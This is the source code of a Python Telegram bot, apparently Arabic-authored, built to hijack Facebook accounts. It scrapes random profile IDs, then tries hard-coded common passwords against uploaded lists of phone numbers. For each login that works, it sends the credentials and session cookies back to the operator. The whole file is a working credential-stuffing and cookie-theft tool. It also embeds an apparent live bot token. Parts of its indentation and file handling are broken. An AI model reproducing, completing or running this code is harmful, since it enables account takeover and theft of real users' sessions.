import telebot
from telebot import types
import threading 
import requests
from bs4 import BeautifulSoup
import random
from FBlevi import Start
Token = input("7325395474:AAFV6BlcNjttgZfbYvh77zupsSO5ys_HV6g")
psw = []
bot = telebot.TeleBot(Token)
L7N1 = types.InlineKeyboardButton(text ="بدء الصيد",callback_data = "L7N1")
L7N_2 = types.InlineKeyboardButton(text ="المبرمج",url="t.me/g_4_q")
get_list = types.InlineKeyboardButton(text ="سحب لستة ايديات",callback_data = "get_list")
@bot.message_handler(commands=["start"])
def start(message):
	photo = f"t.me/{message.from_user.username}"
	tag = f"[{message.from_user.first_name}]({photo})"
	text = "*اهلا* {}* في بوت صيد فيس🐉 !*".format(tag)
	L7Nbut1 = types.InlineKeyboardMarkup()
	L7Nbut1.add(L7N1)
	L7Nbut1.add(get_list)
	L7Nbut1.add(L7N_2)
	bot.send_photo(message.chat.id,photo,text ,
 parse_mode="Markdown",reply_markup=L7Nbut1)

@bot.callback_query_handler(lambda call:True)
def caall(call): 
		if call.data == "L7N1":			
			messag=bot.send_message(chat_id=call.message.chat.id,text=' *ارسل ملف .txt :*',parse_mode='Markdown')								
			bot.register_next_step_handler(messag,check,messag.id)
		elif call.data == "get_list":
			messag=bot.send_message(chat_id=call.message.chat.id,text=' *  ارسل عدد الايديات التي تريد سحبها*',parse_mode='Markdown')			
			bot.register_next_step_handler(messag,get_id,messag.id)
def get_id(message,id):
	idd = message.chat.id
	okk =0
	sent_message =bot.reply_to(message,"يتم سحب الان")
	rang = message.text
	for _ in range(int(rang)):
	           ed =""
	           try:
	           	ids = '1000' + ''.join(str(random.randint(0, 9)) for _ in range(11))
	           	rr = requests.get('https://www.facebook.com/profile.php?id='+ids).text
	           	sop = BeautifulSoup(rr, 'html.parser').title
	           	if 'Facebook' in sop.string:
	           		pass
	           	else:
	           	   okk+=1
	           	   ed += f"*تم سحب (*`{okk}`*/*`{int(rang)}`*) : {ids}*"
	           	   bot.edit_message_text(chat_id=message.chat.id, message_id=sent_message.message_id, text=ed,parse_mode="Markdown")         	           	 
	           	   with open('list_ids.txt', 'a') as F:
	           	   	F.write(ids + '\n')	                              
	           except:
	           	pass
	file = open('list_ids.txt', 'rb')
	bot.send_document(idd,file,caption=f"""
*تم حفظ ({okk}) ايدي ✅*

*BY :* [𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™](t.me/g_4_q)
    """,parse_mode="Markdown")
	
def check(message,id):
    idd = message.chat.id
    namee = message.document.file_name
    download  = bot.get_file(message.document.file_id)
    down_file = bot.download_file(download.file_path)    
    with open(namee, 'wb') as gett:
    	gett.write(down_file)
    	p_file = open(namee, "r")
    	psw.append("19901990")
    	psw.append("19701970")
    	psw.append("19771977")
    	psw.append("19891989")
    	psw.append("19751975")
    	psw.append("19761976")
    	psw.append("19811981")
    	psw.append("20222022")
    	psw.append('30303030')
    	psw.append("0099887766")
    	psw.append("1234@@@@")
    OK =0
    CP =0
    with open(namee, 'wb') as gett:
    	gett.write(down_file)
    	p_file2 = open(namee, "r")
    for _ in range(len(p_file.readlines())):    	
    	phone = p_file2.readline().split('\n')[0]
    	for password in psw:						
    						try:
    							FB = Start(email=phone, password=password)
    							if FB.IsValid:
  	  					    	 Cookie =FB.cookie
  	  					    	 OK+=1
  	  					    	 vid = "https://t.me/yyyyyy3w/6" 	  					    	 
  	  					    	 bot.send_video(message.chat.id,video="{}".format(vid),caption='''
⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
❖ -𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : {}
❖ -𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 : {}
❖ -𝐁𝐘 : @g_4_q
⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
    	           	       '''.format(phone,password))
  	  					    	 with open('Cookie.txt', 'a') as f:
  	  					    	 	f.write(Cookie + '\n')
  	  					    	 	file = open('cookies.txt', 'rb')
  	  					    	 	bot.send_document(idd,file,caption="""
*تم سحب الكوكيز !*
*BY :* [𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™](t.me/g_4_q)
    """,parse_mode="Markdown")    	           	       
   		 					else:
	   	 				 		CP+=1
	   		 			except:CP+1
		    				OK_CP_Check_L7N=types.InlineKeyboardButton(text="{} : {}".format(phone,password), callback_data="1")
	    					OK1 =types.InlineKeyboardButton(text="OK : {}".format(OK), callback_data="2")
    						CP1 =types.InlineKeyboardButton(text="CP : {}".format(CP), callback_data="3")
 	   					L7Nurl =types.InlineKeyboardButton(text="Programmer 🐉 ", url="t.me/g_4_q")
 	   					L7Nbut2 = types.InlineKeyboardMarkup(row_width=2)
  	  					L7Nbut2 = types.InlineKeyboardMarkup()
   	 					L7Nbut2.add(OK_CP_Check_L7N)
    						L7Nbut2.add(OK1)
  	  					L7Nbut2.add(CP1)
  	  					L7Nbut2.add(L7Nurl)
   	 					bot.edit_message_text(chat_id=message.chat.id,message_id=id,text="""
*Checker Acc is Working Good Luck Bro !*
*By ↝* [𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™](t.me/g_4_q) 🐉
""",parse_mode="markdown",disable_web_page_preview=True,reply_markup=L7Nbut2)
    bot.send_message(message.chat.id,text = "*The Checker was Finished !*",parse_mode="Mrakdown")

#L7N 

def bot_thread():
    if __name__ == '__main__':
        bot.polling(none_stop=True)
thread = threading.Thread(target=bot_thread)
thread.start()
